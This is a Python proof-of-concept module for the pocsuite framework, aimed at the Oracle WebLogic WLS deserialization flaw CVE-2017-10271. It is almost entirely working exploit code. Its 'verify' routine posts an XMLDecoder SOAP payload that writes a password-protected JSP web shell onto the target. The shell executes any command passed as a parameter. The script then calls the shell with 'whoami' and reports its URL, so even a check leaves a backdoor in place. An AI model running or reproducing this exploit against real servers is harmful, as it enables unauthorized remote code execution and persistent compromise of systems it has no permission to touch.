#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : jeffzhang
# @Time    : 18-7-9
# @File    : _180709_WebLogic_WLS_RCE.py
# @Desc    : ""


import random
from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase


class TestPOC(POCBase):
    vulID = '00007'
    version = '1'
    author = 'jeffzhang'
    vulDate = '2017-10-17'
    createDate = '2018-07-09'
    updateDate = '2018-07-09'
    references = ['https://nvd.nist.gov/vuln/detail/CVE-2017-10271']
    name = 'Weblogic WLS RCE'
    appPowerLink = 'https://www.oracle.com/middleware/weblogic/index.html'
    appName = 'Weblogic'
    appVersion = '10.3.6.*,12.1.3.*,12.2.1.1-2'
    vulType = 'RCE'
    desc = '''
    Vulnerability in the Oracle WebLogic Server component of Oracle Fusion Middleware (subcomponent: WLS Security)
    '''
    samples = ['']

    def _verify(self):
        result = {}
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
            "Accept-Charset": "GBK,utf-8;q=0.7,*;q=0.3",
            "Content-Type": "text/xml"
        }
        payload = '''
                <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext
                xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><java version="1.4.0" class="java.beans.XMLDecoder">
                <void class="java.io.PrintWriter"> <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/0bxxl42slk.jsp</string>
                <void method="println"><string><![CDATA[<%   if("hobs7p".equals(request.getParameter("pwd"))){
                    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
                    int a = -1;
                    byte[] b = new byte[2048];
                    out.print("flag:m36ty4jg");
                    while((a=in.read(b))!=-1){
                        out.println(new String(b));
                    }
                } %>]]></string></void><void method="close"/>
                </void></java></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>
            '''
        try:
            if '://' not in self.url:
                self.url = 'http://' + self.url
            url_1 = self.url + '/wls-wsat/CoordinatorPortType11'
            req.post(url_1, data=payload, headers=headers, timeout=5)
            url_2 = self.url + '/bea_wls_internal/0bxxl42slk.jsp?pwd=hobs7p&i=whoami'
            resp = req.get(url_2, timeout=5)
            if resp.status_code == 200 and 'flag:m36ty4jg' in resp.content:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Webshell'] = self.url + '/bea_wls_internal/0bxxl42slk.jsp?pwd=hobs7p&i=whoami'
                result['VerifyInfo']['Response'] = resp.content[13:38]
        except Exception as e:
            print(e)
        return self.parse_attack(result)

    def _attack(self):
        return self._verify

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet noting return')
        return output


register(TestPOC)
